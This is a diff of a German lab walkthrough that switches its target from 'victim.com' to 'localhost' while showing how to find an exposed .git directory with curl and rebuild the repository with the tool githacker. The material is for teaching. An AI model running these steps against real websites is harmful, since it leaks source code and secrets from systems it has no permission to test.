@@ -26,7 +26,7 @@ Die folgenden Schritte gehen davon aus, dass du dich in der Laborumgebung befind
 ### 1. Zugriff auf die Beispiel-Webseite
 
 ```bash
-curl http://victim.com:8000
+curl http://localhost:8000
 ```
 
 Die Startseite wird angezeigt und informiert dich, dass Dateien im `config`-Verzeichnis nicht zugänglich sind.
@@ -34,7 +34,7 @@ Die Startseite wird angezeigt und informiert dich, dass Dateien im `config`-Verz
 ### 2. Zugriff auf das Config-Verzeichnis testen
 
 ```bash
-curl http://victim.com:8000/config
+curl http://localhost:8000/config
 ```
 
 Der Zugriff wird verweigert – der Webserver blockiert das Verzeichnis wie erwartet.
@@ -42,7 +42,7 @@ Der Zugriff wird verweigert – der Webserver blockiert das Verzeichnis wie erwa
 ### 3. Zugriff auf das `.git`-Verzeichnis prüfen
 
 ```bash
-curl http://victim.com:8000/.git/config
+curl http://localhost:8000/.git/config
 ```
 
 Die Ausgabe zeigt die Git-Konfiguration – das `.git`-Verzeichnis ist zugänglich!
@@ -50,7 +50,7 @@ Die Ausgabe zeigt die Git-Konfiguration – das `.git`-Verzeichnis ist zugängli
 ### 4. Repository mit Githacker rekonstruieren
 
 ```bash
-githacker --url http://victim.com:8000 --output-folder git-hack
+githacker --url http://localhost:8000 --output-folder git-hack
 ```
 
 Das Tool lädt alle relevanten Dateien aus dem `.git`-Verzeichnis und stellt das Repository im Ordner `git-hack` wieder her.
